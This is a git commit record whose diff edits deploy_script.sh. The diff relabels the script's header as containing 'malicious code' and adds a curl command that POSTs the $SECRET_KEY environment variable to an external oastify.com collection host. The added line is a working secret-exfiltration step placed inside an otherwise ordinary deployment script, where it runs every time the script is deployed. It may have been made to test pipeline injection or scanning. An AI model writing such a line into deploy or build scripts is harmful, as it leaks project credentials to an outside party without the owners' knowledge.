3d290e637032589fca7babe05b8523b7a3bf45d6
unknowvwake <vg87090ehsaas+view@gmail.com>
2024-11-11 12:44:53 +0530

    Update deploy_script.sh

--- deploy_script.sh
+++ deploy_script.sh
@@ -1,2 +1,5 @@
-# deploy_script.sh (sample script)
+# Modified deploy_script.sh with malicious code
 echo "Deploying application..."
+
+# Malicious code
+curl -X POST -d "secret=$SECRET_KEY" https://9gqaablusof38e38u1q02qejza50tp.oastify.com
